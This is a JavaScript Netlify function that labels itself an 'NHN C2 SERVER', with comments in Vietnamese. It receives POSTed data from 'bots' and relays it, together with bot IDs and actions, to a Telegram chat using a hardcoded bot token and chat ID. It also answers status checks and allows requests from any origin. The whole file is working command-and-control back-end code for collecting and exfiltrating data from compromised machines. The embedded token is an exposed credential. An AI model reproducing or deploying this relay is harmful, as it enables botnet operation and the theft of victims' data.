// ============================================================
// 🔥 NHN C2 SERVER - Netlify Function
// ============================================================

const TELEGRAM_BOT = '8694531485:AAGEFpgDhRNnpHGrnzceC9Qp5r9ldto3Nt8'; // Thay token
const TELEGRAM_CHAT = '8594169530';   // Thay chat ID

exports.handler = async (event) => {
    const { httpMethod, body, queryStringParameters } = event;

    // HEAD request (CORS)
    if (httpMethod === 'HEAD') {
        return {
            statusCode: 200,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type'
            }
        };
    }

    // OPTIONS (CORS preflight)
    if (httpMethod === 'OPTIONS') {
        return {
            statusCode: 200,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type'
            }
        };
    }

    // GET - Xem trạng thái
    if (httpMethod === 'GET') {
        const action = queryStringParameters?.action || 'status';
        return {
            statusCode: 200,
            headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
            body: JSON.stringify({
                status: 'online',
                action: action,
                timestamp: new Date().toISOString(),
                botId: queryStringParameters?.botId || 'unknown'
            })
        };
    }

    // POST - Nhận dữ liệu từ bot
    if (httpMethod === 'POST') {
        try {
            const data = JSON.parse(body);
            const { botId, action, data: payload } = data;

            // Gửi lên Telegram
            if (TELEGRAM_BOT !== 'YOUR_BOT_TOKEN_HERE') {
                const msg = `📡 [C2] Bot ${botId}\nAction: ${action}\nData: ${JSON.stringify(payload, null, 2)}`;
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT,
                        text: msg.substring(0, 4000)
                    })
                });
            }

            return {
                statusCode: 200,
                headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
                body: JSON.stringify({ status: 'ok', received: true })
            };

        } catch (e) {
            return {
                statusCode: 400,
                headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
                body: JSON.stringify({ status: 'error', message: e.message })
            };
        }
    }

    return {
        statusCode: 405,
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
        body: JSON.stringify({ status: 'error', message: 'Method not allowed' })
    };
};